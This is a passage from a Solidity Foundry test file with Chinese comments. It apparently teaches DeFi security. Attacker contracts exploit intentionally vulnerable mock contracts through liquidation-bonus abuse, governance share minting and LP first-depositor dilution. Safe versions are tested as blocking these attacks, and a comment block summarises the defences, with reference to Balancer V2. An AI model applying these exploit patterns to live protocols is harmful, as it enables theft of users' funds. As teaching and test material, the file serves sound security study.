        console.log("Attacker debt tokens before:", dbtBefore);

        debtToken5.approve(address(liqAttacker), type(uint256).max);
        uint256 repayAmount = (aliceDebt * 99) / 100; // choose slightly less than full debt to avoid Insufficient collateral
        liqAttacker.attackVictim(alice, repayAmount);

        uint256 colAfter  = colToken.balanceOf(address(liqAttacker));
        uint256 dbtAfter  = debtToken5.balanceOf(address(liqAttacker));
        uint256 profit    = (colAfter - colBefore) > (dbtBefore - dbtAfter)
            ? (colAfter - colBefore) - (dbtBefore - dbtAfter) : 0;
        console.log("Liquidation profit (15% bonus):", profit);
        assertGt(colAfter - colBefore, dbtBefore - dbtAfter, "Liquidator profits from 15% bonus");
    }

    // 安全版本：5% 奖励合理，防止自我清算
    function testSafeLiquidationNoSelfLiquidation() public {
        console.log("\n== TEST: Safe Liquidation - No Self Liquidation ==");

        // bob 创建仓位
        colToken.transfer(bob, 10_000e18);
        vm.prank(bob);
        colToken.approve(address(safeLiquidation), type(uint256).max);
        vm.prank(bob);
        safeLiquidation.depositCollateral(10_000e18);
        vm.prank(bob);
        safeLiquidation.borrow(7_000e18);
        safeLiquidation.setPrice(8e17); // 触发清算

        // bob 尝试自我清算，应该被阻止
        vm.prank(bob);
        debtToken5.approve(address(safeLiquidation), type(uint256).max);
        vm.prank(bob);
        vm.expectRevert("No self-liquidation");
        safeLiquidation.liquidate(bob, 1000e18);
        console.log("Safe: self-liquidation blocked");
    }

    // ─────────────────────────────────────────────
    // 测试6：份额稀释——治理攻击
    // ─────────────────────────────────────────────
    function testShareDilutionGovAttack() public {
        console.log("\n== TEST: Share Dilution - Governance Inflation ==");

        uint256 aliceGov = vulnDilution.govShares(alice);
        uint256 total    = vulnDilution.totalGovShares();
        console.log("Alice govShares:", aliceGov);
        console.log("Total govShares:", total);

        // 模拟管理员权限被盗：直接由 admin（测试合约）增发给攻击者
        uint256 mintAmount = vulnDilution.totalGovShares() + 1;
        vulnDilution.mintGovShares(address(sdAttacker), mintAmount);

        uint256 attackerGov  = vulnDilution.govShares(address(sdAttacker));
        uint256 newTotal     = vulnDilution.totalGovShares();
        console.log("Attacker govShares:", attackerGov);
        console.log("New total govShares:", newTotal);
        assertGt(attackerGov * 2, newTotal, "Attacker has majority after dilution");
    }

    // LP 份额稀释测试
    function testShareDilutionLP() public {
        console.log("\n== TEST: Share Dilution - LP Attack ==");

        sdAttacker.attackLPDilution(1, 100_000e18, 50_000e18);

        // 验证汇率失真
        uint256 ts = vulnDilution.totalShares();
        uint256 ta = vulnDilution.totalAssets();
        if (ts > 0) {
            console.log("Distorted rate (assets/share):", ta / ts);
            assertGt(ta, ts, "totalAssets >> totalShares after attack");
        }
    }

    // 安全版本：虚拟偏移量 + 治理超级多数 + 时间锁
    function testSafeDilutionResistsAttack() public {
        console.log("\n== TEST: Safe Dilution - Resists LP and Gov Attacks ==");

        // LP：安全 vault 对首存攻击有抵抗力
        token6.transfer(bob, 10_000e18);
        vm.prank(bob);
        token6.approve(address(safeDilution), type(uint256).max);
        vm.prank(bob);
        uint256 bobShares = safeDilution.addLiquidity(10_000e18);
        assertGt(bobShares, 0, "Bob gets shares despite potential first-deposit attack");

        // 治理：增发不超过 10%
        safeDilution.mintGovShares(alice, 100e18);
        safeDilution.mintGovShares(alice, 10e18); // 10%上限
        vm.expectRevert("Exceeds max mint");
        safeDilution.mintGovShares(alice, 1000e18); // 超限，revert
        console.log("Safe: gov share mint capped at 10% per tx");
    }
}


/**
 * ============ 知识点总结 ============
 *
 * 1. 缺失前置条件检查 (Missing Precondition Checks)：
 *    - 每个外部函数都必须完整检查：非零、余额、权限、时间锁、目标有效性
 *    - 零额 deposit 可绕过时间锁（副作用攻击）
 *    - 滑点保护必须真正 require，而非注释掉的占位代码
 *    - Balancer 应用：joinPool/exitPool 的 minBptOut/maxBptIn 不可忽略
 *
 * 2. 不变量假设错误 (Incorrect Invariant Assumptions)：
 *    - 不要假设 totalShares > 0 时汇率合理
 *    - 首存攻击（First Depositor Attack）：1 wei 建立控制 + 捐赠拉高汇率
 *    - 防御：虚拟偏移量（OpenZeppelin ERC-4626 推荐）或死亡份额
 *    - Balancer 应用：BPT 初始化时的 MINIMUM_BPT 和 死亡份额机制
 *
 * 3. 奖励债务计算错误 (Reward Debt Miscalculation)：
 *    - rewardDebt 必须用 = 重新赋值，而非 +=
 *    - 每次 deposit/withdraw/harvest 后都必须更新 rewardDebt
 *    - 公式：rewardDebt = amount * accRPS / PRECISION（不是累加）
 *    - Balancer 应用：gauge 的 integrate_fraction 等价于 accRPS
 *
 * 4. 通胀型排放攻击 (Emission Inflation)：
 *    - 基于快照的奖励分配 vs 时间加权分配（MasterChef accRPS 模式）
 *    - 快照模式：新进入者可追溯历史奖励 → 攻击者等待积累后闪入
 *    - 正确模式：rewardDebt 在入场时锁定 accRPS，无法追溯
 *    - Balancer 应用：veBAL gauge 使用积分曲线，防止即时追溯
 *
 * 5. 清算奖励滥用 (Liquidation Bonus Abuse)：
 *    - 清算奖励过高（>10%）→ 攻击者主动制造可清算仓位
 *    - 必须阻止自我清算（msg.sender != borrower）
 *    - 必须设置最小清算债务阈值（防 dust 攻击）
 *    - 部分清算优于全量清算（减少冲击，防止清算级联）
 *    - Balancer 应用：veBAL 仓位的清算机制需要时间缓冲
 *
 * 6. 份额稀释攻击 (Share Dilution)：
 *    - LP 份额稀释 = 首存攻击（场景2 的经济视角）
 *    - 治理份额稀释 = 管理员增发 + 瞬时超级多数 + 立即执行提案
 *    - Beanstalk 模式：闪电贷 + 快照投票 + 无时间锁 = $182M 被盗
 *    - 防御：超级多数阈值（67%）+ 强制时间锁 + 闪贷快照保护
 *    - Balancer 应用：veBAL 治理的投票权基于锁定时间，防闪贷攻击
 *
 * 与 Balancer V2 的核心连接：
 *    - ComposableStablePool 初始化时的 MINIMUM_BPT = 1e6（防首存攻击）
 *    - gauge 的 working_balance 基于 veBAL 时间加权，防排放通胀
 *    - exitPool 的 minAmountsOut 不可为零，否则遭受场景1攻击
 *    - amplificationParameter 更新需要时间锁，防止场景2不变量被破坏
 *    - BPT 价格计算依赖 invariant D，而非 balanceOf（防场景6稀释）
 */
